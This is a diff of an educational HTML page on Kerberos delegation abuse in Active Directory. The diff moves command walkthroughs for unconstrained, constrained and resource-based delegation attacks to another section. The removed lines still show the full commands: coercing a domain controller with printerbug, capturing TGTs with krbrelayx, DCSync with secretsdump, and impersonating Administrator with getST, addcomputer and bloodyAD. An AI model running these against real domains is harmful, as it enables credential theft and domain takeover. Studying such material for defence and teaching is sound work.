@@ -101,17 +101,6 @@
           host. The DC's TGT lands in your cache, and a DC's TGT is effectively the domain.
         </p>
 
-        <pre><code># find unconstrained-delegation hosts
-(userAccountControl:1.2.840.113556.1.4.803:=524288)
-
-# on the delegation host you control, capture inbound TGTs
-krbrelayx.py -aesKey &lt;host_aes_key&gt;
-# coerce the DC to authenticate to it
-printerbug.py corp.local/user:pass@dc01 attacker_host
-# reuse the captured DC TGT to DCSync
-export KRB5CCNAME=DC01\$@CORP.LOCAL.ccache
-secretsdump.py -k -no-pass dc01.corp.local</code></pre>
-
         <blockquote>
           The flag <code>TRUSTED_FOR_DELEGATION</code> on any computer you can compromise is
           close to game over. Domain controllers have it by design; the danger is when an
@@ -151,10 +140,6 @@ secretsdump.py -k -no-pass dc01.corp.local</code></pre>
           reach that service as Administrator.
         </p>
 
-        <pre><code># impersonate Administrator to an allowed service
-getST.py -spn cifs/dc01.corp.local -impersonate Administrator \
-  corp.local/svc_web:Passw0rd</code></pre>
-
         <blockquote>
           A subtlety worth knowing: the target service name in S4U2Proxy is not strongly
           bound to a single service class, so obtaining a ticket for one SPN on a host often
@@ -193,15 +178,14 @@ getST.py -spn cifs/dc01.corp.local -impersonate Administrator \
           </tbody>
         </table>
 
-        <pre><code># create a computer account you control
-addcomputer.py -computer-name EVIL\$ -computer-pass Passw0rd corp.local/jdoe:pass
-
-# write RBCD on the target to trust EVIL$
-bloodyAD -u jdoe -p pass -d corp.local add rbcd TARGET\$ EVIL\$
-
-# impersonate Administrator to the target
-getST.py -spn cifs/target.corp.local -impersonate Administrator \
-  corp.local/EVIL\$:Passw0rd</code></pre>
+        <p>
+          Each of these three abuses — capturing TGTs from an unconstrained host, S4U
+          impersonation via constrained delegation, and writing an RBCD attribute you control —
+          has its full command walkthrough in the
+          <a href="../vulns.html">Vulns &amp; Misconfigs</a> section under
+          <em>Unconstrained</em>, <em>Constrained</em>, and <em>RBCD</em>. This page is the
+          shared mechanism they all bend.
+        </p>
 
         <h2>Comparison</h2>
 
